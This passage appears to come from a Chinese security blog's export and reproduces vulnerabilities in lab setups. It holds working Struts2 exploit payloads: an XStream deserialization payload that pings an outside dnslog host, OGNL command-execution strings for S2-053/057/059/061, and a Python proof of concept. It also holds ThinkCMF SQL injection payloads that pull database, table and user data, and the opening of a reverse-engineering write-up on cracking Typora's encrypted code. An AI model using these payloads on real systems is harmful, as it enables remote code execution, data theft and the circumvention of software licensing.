&lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</span><br><span class="line">                &lt;/serviceIterator&gt;</span><br><span class="line">                &lt;lock/&gt;</span><br><span class="line">              &lt;/cipher&gt;</span><br><span class="line">              &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</span><br><span class="line">              &lt;ibuffer&gt;&lt;/ibuffer&gt;</span><br><span class="line">              &lt;done&gt;false&lt;/done&gt;</span><br><span class="line">              &lt;ostart&gt;0&lt;/ostart&gt;</span><br><span class="line">              &lt;ofinish&gt;0&lt;/ofinish&gt;</span><br><span class="line">              &lt;closed&gt;false&lt;/closed&gt;</span><br><span class="line">            &lt;/is&gt;</span><br><span class="line">            &lt;consumed&gt;false&lt;/consumed&gt;</span><br><span class="line">          &lt;/dataSource&gt;</span><br><span class="line">          &lt;transferFlavors/&gt;</span><br><span class="line">        &lt;/dataHandler&gt;</span><br><span class="line">        &lt;dataLen&gt;0&lt;/dataLen&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">  &lt;/entry&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">  &lt;/entry&gt;</span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure>



<p>以上数据包成功执行的话，会在docker容器内创建文件<code>/tmp/success</code>，执行<code>docker-compose exec struts2 ls /tmp/</code>即可看到。</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310103905014.png" class title="image-20220310103905014">

<h4 id="漏洞利用-13"><a href="#漏洞利用-13" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">      &lt;flags&gt;0&lt;/flags&gt;</span><br><span class="line">      &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span><br><span class="line">        &lt;dataHandler&gt;</span><br><span class="line">          &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span><br><span class="line">            &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</span><br><span class="line">              &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</span><br><span class="line">                &lt;initialized&gt;false&lt;/initialized&gt;</span><br><span class="line">                &lt;opmode&gt;0&lt;/opmode&gt;</span><br><span class="line">                &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                  &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                    &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</span><br><span class="line">                    &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">                      &lt;command&gt;</span><br><span class="line">                        &lt;string&gt; ping&lt;/string&gt;</span><br><span class="line">                        &lt;string&gt;test.oyyzjl.dnslog.cn&lt;/string&gt;</span><br><span class="line">                      &lt;/command&gt;</span><br><span class="line">                      &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span><br><span class="line">                    &lt;/next&gt;</span><br><span class="line">                  &lt;/iter&gt;</span><br><span class="line">                  &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span><br><span class="line">                    &lt;method&gt;</span><br><span class="line">                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span><br><span class="line">                      &lt;name&gt;start&lt;/name&gt;</span><br><span class="line">                      &lt;parameter-types/&gt;</span><br><span class="line">                    &lt;/method&gt;</span><br><span class="line">                    &lt;name&gt;foo&lt;/name&gt;</span><br><span class="line">                  &lt;/filter&gt;</span><br><span class="line">                  &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</span><br><span class="line">                &lt;/serviceIterator&gt;</span><br><span class="line">                &lt;lock/&gt;</span><br><span class="line">              &lt;/cipher&gt;</span><br><span class="line">              &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</span><br><span class="line">              &lt;ibuffer&gt;&lt;/ibuffer&gt;</span><br><span class="line">              &lt;done&gt;false&lt;/done&gt;</span><br><span class="line">              &lt;ostart&gt;0&lt;/ostart&gt;</span><br><span class="line">              &lt;ofinish&gt;0&lt;/ofinish&gt;</span><br><span class="line">              &lt;closed&gt;false&lt;/closed&gt;</span><br><span class="line">            &lt;/is&gt;</span><br><span class="line">            &lt;consumed&gt;false&lt;/consumed&gt;</span><br><span class="line">          &lt;/dataSource&gt;</span><br><span class="line">          &lt;transferFlavors/&gt;</span><br><span class="line">        &lt;/dataHandler&gt;</span><br><span class="line">        &lt;dataLen&gt;0&lt;/dataLen&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">  &lt;/entry&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">  &lt;/entry&gt;</span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure>



<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310110008343.png" class title="image-20220310110008343">

<h3 id="S2-053"><a href="#S2-053" class="headerlink" title="S2-053"></a>S2-053</h3><h4 id="漏洞简介-14"><a href="#漏洞简介-14" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。</p>
<h4 id="漏洞版本-13"><a href="#漏洞版本-13" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.0.1 - 2.3.33</p>
<p>2.5 -  2.5.10</p>
<h4 id="漏洞探测-14"><a href="#漏洞探测-14" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;id&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="漏洞利用-14"><a href="#漏洞利用-14" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h3 id="S2-057（CVE-2018-11776）"><a href="#S2-057（CVE-2018-11776）" class="headerlink" title="S2-057（CVE-2018-11776）"></a>S2-057（CVE-2018-11776）</h3><h4 id="漏洞简介-15"><a href="#漏洞简介-15" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>当Struts2的配置满足以下条件时：</p>
<ul>
<li>alwaysSelectFullNamespace值为true</li>
<li>action元素未设置namespace属性，或使用了通配符</li>
</ul>
<p>namespace将由用户从uri传入，并作为OGNL表达式计算，最终造成任意命令执行漏洞。</p>
<h4 id="漏洞版本-14"><a href="#漏洞版本-14" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>小于等于 Struts 2.3.34 与 Struts 2.5.16</p>
<h4 id="漏洞探测-15"><a href="#漏洞探测-15" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p>测试OGNL表达式<code>$&#123;233*233&#125;</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://your-ip:8080/struts2-showcase/$%7B233*233%7D/actionChain1.action</span><br></pre></td></tr></table></figure>

<p>返回表达式执行结果</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310111833429.png" class title="image-20220310111833429">

<h4 id="漏洞利用-15"><a href="#漏洞利用-15" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>获取id信息</strong></p>
<p>需要将其进行URL编码转换</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&#x27;struts.valueStack&#x27;].context).(#cr=#ct[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;)).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))&#125;</span><br></pre></td></tr></table></figure>

<p>获取id信息值</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310113350760.png" class title="image-20220310113350760">



<p><strong>获取当前用户</strong></p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310113456090.png" class title="image-20220310113456090">

<h3 id="S2-059-CVE-2019-0230"><a href="#S2-059-CVE-2019-0230" class="headerlink" title="S2-059  (CVE-2019-0230)"></a>S2-059  (CVE-2019-0230)</h3><h4 id="漏洞简介-16"><a href="#漏洞简介-16" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>Apache Struts框架, 会对某些特定的标签的属性值，比如id属性进行二次解析，所以攻击者可以传递将在呈现标签属性时再次解析的OGNL表达式，造成OGNL表达式注入。从而可能造成远程执行代码。</p>
<h4 id="漏洞版本-15"><a href="#漏洞版本-15" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.0.0 -  2.5.20</p>
<h4 id="漏洞探测-16"><a href="#漏洞探测-16" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p>访问 <code>http://your-ip:8080/?id=%25%7B233*233%7D</code>，可以发现233*233的结果被解析到了id属性中：</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310141627782.png" class title="image-20220310141627782">



<h4 id="漏洞利用-16"><a href="#漏洞利用-16" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>poc</strong></p>
<p>在tmp目录下创建success文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://ip:8080&quot;</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses(&#x27;&#x27;)).(#ognlUtil.setExcludedPackageNames(&#x27;&#x27;))&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">data2 = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(&#x27;touch /tmp/success&#x27;))&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">res1 = requests.post(url, data=data1)</span><br><span class="line"><span class="comment"># print(res1.text)</span></span><br><span class="line">res2 = requests.post(url, data=data2)</span><br><span class="line"><span class="comment"># print(res2.text)</span></span><br></pre></td></tr></table></figure>

<p>创建文件成功</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310141245421.png" class title="image-20220310141245421">

<h3 id="S2-061"><a href="#S2-061" class="headerlink" title="S2-061"></a>S2-061</h3><h4 id="漏洞简介-17"><a href="#漏洞简介-17" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>S2-061是对S2-059的绕过，Struts2官方对S2-059的修复方式为加强OGNL表达式沙盒，而S2-061绕过了该沙盒</p>
<h4 id="漏洞版本-16"><a href="#漏洞版本-16" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.0.0 -  2.5.25</p>
<h4 id="漏洞探测-17"><a href="#漏洞探测-17" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p>GNL表达式执行成功</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310145518461.png" class title="image-20220310145518461">



<h4 id="漏洞利用-17"><a href="#漏洞利用-17" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=%25&#123;(%27Powered_by_Unicode_Potats0%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application[%27org.apache.tomcat.InstanceManager%27]).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3d%23attr[%27struts.valueStack%27]).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d&#123;%27id%27&#125;).(%23res%3d%23exec.exec(%23cmd))&#125;</span><br></pre></td></tr></table></figure>



<p>返回服务器id值</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310150417451.png" class title="image-20220310150417451">

]]></content>
      <categories>
        <category>Web漏洞</category>
        <category>Web漏洞</category>
        <category>Apache</category>
      </categories>
      <tags>
        <tag>-web漏洞 -OGNL表达式 -Struts2漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>ThinkcmfSQL注入漏洞复现</title>
    <url>/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="ThinkCMF-x2-2-2多处SQL注入漏洞复现"><a href="#ThinkCMF-x2-2-2多处SQL注入漏洞复现" class="headerlink" title="ThinkCMF x2.2.2多处SQL注入漏洞复现"></a>ThinkCMF x2.2.2多处SQL注入漏洞复现</h1><h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><p>ThinkCMF是一款基于ThinkPHP+MySQL开发的中文内容管理框架，其中X系列基于ThinkPHP<br>3.2.3开发，最后更新到2.2.2版本。存在多个SQL注入漏洞</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>下载地址如下：<a href="https://links.jianshu.com/go?to=https://github.com/thinkcmf/cmfx/releases">https://github.com/thinkcmf/cmfx/releases</a></p>
<p><strong>工具</strong></p>
<p>火狐浏览器</p>
<p>Hacker插件</p>
<p>这里下载的是x2.2.2版本进行漏洞复现</p>
<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/bce12b0d93be364eaf36f549717488e0.png" class>



<p>在火狐浏览器上访问该thinkcms默认页面index.php(刚开始访问时需要进行安装)</p>
<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/d4928ad85b1318849c844c189449bd55.png" class>



<p>为其创建数据库thinkcmf</p>
<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/bb50a809bd8046609fff8076fa2a7217.png" class>



<p>安装ThinkCMF成功，环境搭建成功</p>
<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/3eea1de2a8aef4f9d9bb7d9680acf8a0.png" class>



<p>通过浏览器访问127.0.0.1&#x2F;thinkcmfx2.2进入前台页面，如下</p>
<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/4aea1ec411f6001c2cc08018ae1fe0cb.png" class>



<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="前台文章编辑出存在漏洞"><a href="#前台文章编辑出存在漏洞" class="headerlink" title="前台文章编辑出存在漏洞"></a>前台文章编辑出存在漏洞</h4><p>构造Payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1/thinkcmfx2.2/index.php?g=portal&amp;m=article&amp;a=edit_post</span><br><span class="line"></span><br><span class="line">POST: post[id][0]=bind&amp;post[id][1]=2 and updatexml(1,</span><br><span class="line">concat(0x7e,user(),0x7e),1)-- -</span><br></pre></td></tr></table></figure>



<p>使用报错注入函数updatexml()函数报错输出用户名(也可以使用extractvalue())</p>
<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/43237512b8c2f1f11021db6ee973ebb4.png" class>



<p>修改user()为database()输出数据库名为thinkcmf</p>
<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/7eaaf40d0f426704f6ff26202d5fe8b2.png" class>

<p>得到数据库后，又得到该数据库版本大于5.0，所以可以使用information_schema这个数据库进行查询。</p>
<p>Payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1/thinkcmfx2.2/index.php?g=portal&amp;m=article&amp;a=edit_pos</span><br><span class="line"></span><br><span class="line">POST: post[id][0]=bind&amp;post[id][1]=2 and extractvalue(1, concat(0x7e,(select</span><br><span class="line">table_name from information_schema.tables where table_schema=&#x27;thinkcmf&#x27; limit</span><br><span class="line">23,1 ),0x7e))-- -</span><br></pre></td></tr></table></figure>



<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/3192b554f9e7990f7e0b8f0854e9e4e4.png" class>



<p>这里本来想使用concat_group()函数输入，但是提示无效使用</p>
<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/3e9fad8a4e250e95ab38f3288d9bb591.png" class>

<p>就使用limit一个一个的输出thinkcmf数据库中的表(也可以使用暴力破解)</p>
<p>得到个cmf_users的表，继续查询该表中的账号信息，查询账户密码如下图</p>
<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/04bcaae9a7b9e47d1e651eec624ac286.png" class>



<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/a225b280efb348c7a7cb74d14de408e3.png" class>



<h4 id="后台管理"><a href="#后台管理" class="headerlink" title="后台管理"></a>后台管理</h4><p>后台管理那里，幻灯片的删除存在漏洞。（下面只进行验证，漏洞利用和上面是一样的）</p>
<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/2014b8e22db83db79ff768f9418f0071.png" class>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Payload: &lt;http://127.0.0.1/cmfx2.2/index.php?g=Admin&amp;m=slide&amp;a=delet&gt;</span><br><span class="line"></span><br><span class="line">ids[]=1&amp;ids[]=0 and updatexml(1, concat(0x7e,user(),0x7e),1)</span><br></pre></td></tr></table></figure>

<p>查询获取当前用户为root</p>
<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/fe0499d2a0a3fca2bdf56a0c800d8f1c.png" class>



<h4 id="导航编辑"><a href="#导航编辑" class="headerlink" title="导航编辑"></a>导航编辑</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Payload: &lt;http://127.0.0.1/cmfx2.2/index.php?g=Admin&amp;m=nav&amp;a=edit_post&gt;</span><br><span class="line"></span><br><span class="line">Post:  parentid=1 and updatexml(1,concat(0x7e,database(),0x7e),1)</span><br></pre></td></tr></table></figure>

<p>查询获取数据库名为thinkcmf</p>
<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/38209837e7e2a2dfa380a5bae7f14fcc.png" class>



<h4 id="评论审核页面"><a href="#评论审核页面" class="headerlink" title="评论审核页面"></a>评论审核页面</h4><img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/f7b367cb9d47e0c17e05fba0a9001a42.png" class>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">http://127.0.0.1/cmfx2.2/index.php?g=Comment&amp;m=commentadmin&amp;a=check&amp;check=1</span><br><span class="line"></span><br><span class="line">POST: ids[]=1&amp;ids[]=2 and updatexml(1,concat(0x7e,version(),0x7e),1)</span><br></pre></td></tr></table></figure>

<p>报错输出数据库版本为5.5.53</p>
<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/7efcd66847ecdf9e77c0b620324df7e6.png" class>
]]></content>
      <categories>
        <category>Web漏洞</category>
        <category>Web应用漏洞</category>
        <category>Thinkcmf</category>
      </categories>
      <tags>
        <tag>-web漏洞 -框架漏洞 -Thinkcmf</tag>
      </tags>
  </entry>
  <entry>
    <title>Typora破解之逆向分析（上）</title>
    <url>/2023/03/12/Typora%E7%A0%B4%E8%A7%A3%E4%B9%8B%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/</url>
    <content><![CDATA[<h1 id="Typora破解之逆向分析（上）"><a href="#Typora破解之逆向分析（上）" class="headerlink" title="Typora破解之逆向分析（上）"></a>Typora破解之逆向分析（上）</h1><h2 id="开发环境识别"><a href="#开发环境识别" class="headerlink" title="开发环境识别"></a>开发环境识别</h2><p>用IDA打开Typroa.exe，可以看到有electron、Node字样</p>
<img src="/2023/03/12/Typora%E7%A0%B4%E8%A7%A3%E4%B9%8B%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20230902115807582.png" class title="image-20230902115807582">

<p>打开程序目录，可以看到asar文件、node字样，联想到nodeJs，猜测可能是由JS写的</p>
<img src="/2023/03/12/Typora%E7%A0%B4%E8%A7%A3%E4%B9%8B%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20230903093250514.png" class title="image-20230903093250514">

<p>在查询后得知electron是使用Nodejs的前端开发框架的桌面应用程序，electron使用了谷歌的v8引擎以及渲染引擎，分为主进程喝渲染进程，通过IPC进行交换信息。asar格式文件是和tar风格的归档格式，electron无需解压即可从中读取任意文件。</p>
<img src="/2023/03/12/Typora%E7%A0%B4%E8%A7%A3%E4%B9%8B%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20230903105721898.png" class title="image-20230903105721898">

<p>可以看到在app.asar.unpacked中发现了一个main.node，node文件是nodejs解析器将js代码转换成二进制代码的文件格式，所以js代码大都在这里面</p>
<p>接下来打开Typora进程，使用x64dbg附加找到typora相关信息，发现有好几个进程，可以看到命令行参数可以看到渲染gpu等关键字，并且目录指向了app.asar</p>
<img src="/2023/03/12/Typora%E7%A0%B4%E8%A7%A3%E4%B9%8B%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20230903113217845.png" class title="image-20230903113217845">

<p>由于只有一个主进程，其他附加进程都是主进程创建的，我们来看下附加进程。可以看到其中有个main.node模块，为什么node可以当dll加载呢？</p>
<img src="/2023/03/12/Typora%E7%A0%B4%E8%A7%A3%E4%B9%8B%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20230903115422578.png" class title="image-20230903115422578">

<p>使用PE工具查一下，VS2017编译的64位dll</p>
<img src="/2023/03/12/Typora%E7%A0%B4%E8%A7%A3%E4%B9%8B%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20230903153801525.png" class title="image-20230903153801525">

<p>使用010editor查看该app.asar，得到文件信息和加密信息</p>
<img src="/2023/03/12/Typora%E7%A0%B4%E8%A7%A3%E4%B9%8B%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20230903155710550.png" class title="image-20230903155710550">



<h2 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h2><p><strong>已知信息</strong></p>
<ul>
<li>框架为electron，框架会直接加载main.node模块</li>
<li>JS文件被加密，解析JS脚本的是V8引擎</li>
</ul>
<p><strong>根据已知信息，对程序的整体逻辑进行简单的分析</strong></p>
<ul>
<li>V8不能解析加密的JS代码，需要将加密的JS代码进行解密后才能送到js引擎执行</li>
<li>由于electron框架需要加载main.node模块，可能就是需要对加密的js代码进行解密操作</li>
</ul>
<p><strong>整体逻辑</strong></p>
<p>框架加载main.node模块去解密app.asar的JS代码并送到JS引擎中进行渲染执行(一种是解密所有JS代码；一种是解密某个js代码，其他代码由解密出来的那个代码进行解密)</p>
<h2 id="node分析"><a href="#node分析" class="headerlink" title="node分析"></a>node分析</h2><p>根据上面的分析得到main.node是解密模块，我们来对其进行具体分析</p>
<img src="/2023/03/12/Typora%E7%A0%B4%E8%A7%A3%E4%B9%8B%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20230903171255261.png" class title="image-20230903171255261">

<p>根据逆向的惯例，我们先寻找字符串，可以看到有Buffer、base64、app.asar、electron等字样</p>
<img src="/2023/03/12/Typora%E7%A0%B4%E8%A7%A3%E4%B9%8B%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20230903171344097.png" class title="image-20230903171344097">

<p>使用FindCrypt3插件找到AES的算法常量</p>
<img src="/2023/03/12/Typora%E7%A0%B4%E8%A7%A3%E4%B9%8B%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20230904150452541.png" class title="image-20230904150452541">

<p>我们来看看AES的加解密操作</p>
<ul>
<li>选择合适的密钥长度：AES算法支持128位、192位和256位三种密钥长度。根据安全需求选择合适的密钥长度。</li>
<li>选择加密模式和填充方案：根据应用场景和需求选择合适的加密模式和填充方案。常见的加密模式有ECB、CBC、CTR等，常见的填充方案有PKCS7、PKCS5、NoPadding等。</li>
<li>密钥生成和扩展：根据选择的密钥长度生成密钥，并通过密钥扩展算法生成每一轮操作所需的子密钥。</li>
<li>分组处理：将待加密的明文按照分组长度（128位）进行划分，得到多个分组。</li>
<li>加密过程：对每个分组进行多轮的迭代操作，包括字节替代、行移位、列混淆和轮密钥加等步骤，最终得到密文。</li>
<li>解密过程：对密文进行逆向操作，包括轮密钥逆序加、逆向列混淆、逆向行移位和逆向字节替代等步骤，最终得到明文。</li>
</ul>
<p>我们在上面的字符串中找到了app.asar这个关键词，我们进一步观察用到其被交叉引用的伪代码</p>
<img src="/2023/03/12/Typora%E7%A0%B4%E8%A7%A3%E4%B9%8B%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20230904152533966.png" class title="image-20230904152533966">

<p>可以推测这个函数加载了app.asar的内容，然后调用sub_180003E40对其进行解密</p>
<img src="/2023/03/12/Typora%E7%A0%B4%E8%A7%A3%E4%B9%8B%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20230904153759297.png" class title="image-20230904153759297">

<p>跟进sub_180003E40函数，发现base64、buffer和from等字符串的使用，查阅相关资料，推测使用了Buffer.from()对缓冲区中的数据进行Base64解码</p>
